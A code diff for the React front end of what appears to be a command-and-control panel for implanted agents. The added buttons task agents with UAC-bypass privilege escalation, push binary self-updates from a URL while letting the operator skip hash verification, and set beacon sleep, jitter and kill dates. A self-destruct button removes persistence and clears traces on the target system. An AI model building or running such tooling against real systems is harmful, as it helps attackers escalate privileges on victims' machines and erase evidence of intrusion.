+          api.createTask(agentId, 'config_store_write', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
+          showToast('✅ Config updated');
+        }}>✓ Update Config</button>
+        <button style={S.toolBtn} onClick={() => showToast('🔄 Reconnecting agent...')}>↻ Reconnect</button>
+        <button style={{ ...S.toolBtn, ...S.btnWarn }} onClick={() => setShowUpdateDialog(!showUpdateDialog)}>↑ Update Agent</button>
+        <button style={{ ...S.toolBtn, ...S.btnWarn }} onClick={() => { api.createTask(agentId, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }}>⚡ Escalate Privileges</button>
       </div>
 
       {showUpdateDialog && (
-        <div style={{ marginTop: 16, padding: 16, border: '1px solid var(--border)', background: 'var(--surface)' }}>
-          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-sec)', marginBottom: 12, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
+        <div style={{ margin: '0 12px 12px', padding: 16, border: '1px solid var(--border)', background: '#15171b' }}>
+          <div style={{ fontSize: 11, fontWeight: 700, color: 'rgba(255,255,255,0.7)', marginBottom: 12, textTransform: 'uppercase', letterSpacing: 1.4, fontFamily: 'var(--font-mono)' }}>
             Self-Update Agent Binary
           </div>
-          <div className="form-group">
-            <label className="form-label">Binary URL</label>
-            <input type="text" className="form-input" value={updateUrl} onChange={e => setUpdateUrl(e.target.value)} placeholder="https://example.com/agent.exe" />
+          <div style={{ marginBottom: 8 }}>
+            <label style={{ fontSize: 10, color: 'rgba(255,255,255,0.5)', display: 'block', marginBottom: 4, fontFamily: 'var(--font-mono)' }}>Binary URL</label>
+            <input type="text" value={updateUrl} onChange={e => setUpdateUrl(e.target.value)}
+              placeholder="https://example.com/agent.exe" style={{ ...cfgInput, width: '100%' }} />
           </div>
-          <div className="form-group" style={{ marginTop: 8 }}>
-            <label className="form-label">SHA256 Hash (optional)</label>
-            <input type="text" className="form-input" value={updateHash} onChange={e => setUpdateHash(e.target.value)} placeholder="Leave empty to skip verification" style={{ fontFamily: 'var(--font-mono)', fontSize: 10 }} />
+          <div style={{ marginBottom: 12 }}>
+            <label style={{ fontSize: 10, color: 'rgba(255,255,255,0.5)', display: 'block', marginBottom: 4, fontFamily: 'var(--font-mono)' }}>SHA256 Hash (optional)</label>
+            <input type="text" value={updateHash} onChange={e => setUpdateHash(e.target.value)}
+              placeholder="Leave empty to skip verification" style={{ ...cfgInput, width: '100%', fontSize: 10 }} />
           </div>
-          <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
-            <button className="btn btn-green" onClick={sendUpdate} disabled={!updateUrl}>SEND UPDATE</button>
-            <button className="btn" onClick={() => setShowUpdateDialog(false)}>CANCEL</button>
+          <div style={{ display: 'flex', gap: 8 }}>
+            <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => {
+              if (!updateUrl) return;
+              api.createTask(agentId, 'self_update', { url: updateUrl, hash: updateHash });
+              setShowUpdateDialog(false); setUpdateUrl(''); setUpdateHash('');
+              showToast('⬆ Pushing update to agent...');
+            }} disabled={!updateUrl}>SEND UPDATE</button>
+            <button style={S.toolBtn} onClick={() => setShowUpdateDialog(false)}>CANCEL</button>
           </div>
         </div>
       )}
-      <div style={{ marginTop: 40, paddingTop: 20, borderTop: '1px solid var(--border)' }}>
-        <button className="btn btn-red" style={{ fontSize: 11, padding: '12px 24px' }} onClick={() => setShowSelfDestruct(true)}>SELF DESTRUCT</button>
-        <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-disabled)', marginTop: 8 }}>
-          Removes all persistence, clears traces, terminates agent process.
+
+      <div style={{ ...S.sectionTitle, marginTop: 4, borderTop: '1px solid rgba(255,68,68,0.2)' }}>DANGER ZONE</div>
+      <div style={{ padding: 16 }}>
+        <button style={{ ...S.toolBtn, ...S.btnDanger, padding: '10px 24px', fontSize: 12 }}
+          onClick={() => setShowSelfDestruct(true)}>☠ SELF DESTRUCT</button>
+        <div style={{ color: 'rgba(255,255,255,0.3)', fontSize: 10, marginTop: 6, fontFamily: 'var(--font-mono)' }}>
+          Removes agent binary, cleans persistence, overwrites artifacts, terminates process.
         </div>
       </div>
 
-      <ConfirmModal
-        open={showSelfDestruct}
-        title="CONFIRM SELF DESTRUCT"
-        message="This will terminate the agent process, remove all persistence mechanisms, and clear all traces from the target system. This action is IRREVERSIBLE."
-        detail={
-          <>
-            <div><span style={{ color: 'var(--text-muted)' }}>AGENT: </span><span style={{ color: 'var(--green)' }}>{agentId}</span></div>
-            <div><span style={{ color: 'var(--red)' }}>All persistence will be removed. The agent will not reconnect.</span></div>
-          </>
-        }
+      <ConfirmModal open={showSelfDestruct} title="CONFIRM SELF DESTRUCT"
+        message="This will terminate the agent process, remove all persistence mechanisms, and clear all traces. This action is IRREVERSIBLE."
+        detail={<><div><span style={{ color: 'rgba(255,255,255,0.5)' }}>AGENT: </span><span style={{ color: 'var(--green)' }}>{agentId}</span></div>
+          <div><span style={{ color: 'var(--red)' }}>All persistence will be removed. The agent will not reconnect.</span></div></>}
         confirmLabel="SELF DESTRUCT"
-        onConfirm={selfDestructConfirm}
-        onCancel={() => setShowSelfDestruct(false)}
-      />
+        onConfirm={() => { api.createTask(agentId, 'cleanup', {}); setShowSelfDestruct(false); showToast('💀 Self-destruct initiated'); }}
+        onCancel={() => setShowSelfDestruct(false)} />
     </div>
   );
 }
